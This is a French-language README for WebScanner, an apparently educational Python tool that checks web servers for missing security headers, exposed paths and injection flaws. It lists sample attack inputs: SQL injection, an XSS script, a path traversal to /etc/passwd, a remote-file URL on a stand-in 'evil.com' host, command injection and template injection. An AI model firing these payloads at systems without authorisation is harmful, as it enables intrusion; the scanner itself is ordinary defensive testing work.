# 🛡️ WebScanner

WebScanner est un scanner de sécurité web simple et modulaire écrit en Python.  
Il permet de détecter les failles courantes comme :
- En-têtes HTTP manquants
- Chemins sensibles accessibles
- Vulnérabilités d’injection (XSS, SQLi, LFI, RFI, etc.)

---

## 🚀 Fonctionnalités

✅ Analyse des en-têtes de sécurité HTTP  
✅ Détection de chemins courants (`/admin`, `.git`, `/backup.zip`...)  
✅ Test de payloads malveillants (XSS, LFI, RFI, command injection...)  
✅ Rapport HTML clair avec niveaux de gravité et liens vers des solutions  
✅ Détection améliorée avec preuves d’exploitation (ex. : inclusion réelle de fichiers)  
✅ Modularité : chaque fonctionnalité est dans un module séparé (facile à maintenir)

---

## 📁 Arborescence

webscanner/
│
├── scanner.py # Script principal
├── payloads.txt # Liste de payloads d'injection
├── paths.txt # Liste de chemins communs à tester
├── rapport.html # Rapport généré automatiquement
├── scanner.log # Log des erreurs réseau
│
├── modules/
│ ├── headers.py # Analyse des en-têtes
│ ├── pages.py # Scan des chemins
│ ├── injection.py # Test des injections
│
├── utils/
│ ├── report.py # Génération du rapport HTML
│ ├── classifier.py # Classification des payloads
│ ├── detection_signatures.py # Signatures pour détection réelle
│
└── pycache/ # Fichiers Python compilés (à ignorer)

---

## ⚙️ Installation

### 1. Cloner le projet :
git clone https://github.com/ton-utilisateur/webscanner.git
cd webscanner

🧪 Utilisation
Scanner une URL : python3 scanner.py
ou directement : python3 scanner.py https://example.com

Résultat :
Un fichier rapport.html est généré dans le dossier courant.
Il contient :

La liste des failles détectées

Leur type (ex. : XSS, LFI...)

Leur niveau de dangerosité (Critique, Moyen, Info)

Des liens vers les solutions recommandées

---

📚 Exemples de payloads
Le fichier payloads.txt inclut plusieurs types de tests :

SQLi : ' OR 1=1 --

XSS : <script>alert(1)</script>

LFI : ../../../../etc/passwd

RFI : http://evil.com/shell.txt

Command Injection : $(id)

SSTI : {{7*7}}

🛠 Personnalisation
Ajouter des chemins à tester → paths.txt

Ajouter ou modifier des payloads → payloads.txt

Modifier le style ou le contenu du rapport → utils/report.py

---

🔒 Avertissement
⚠️ Ce projet est destiné à des fins éducatives uniquement.
N’utilisez cet outil que sur vos propres serveurs ou avec autorisation explicite.
Toute utilisation abusive est interdite.

---

📄 Licence
MIT License — Libre pour usage, modification et distribution.
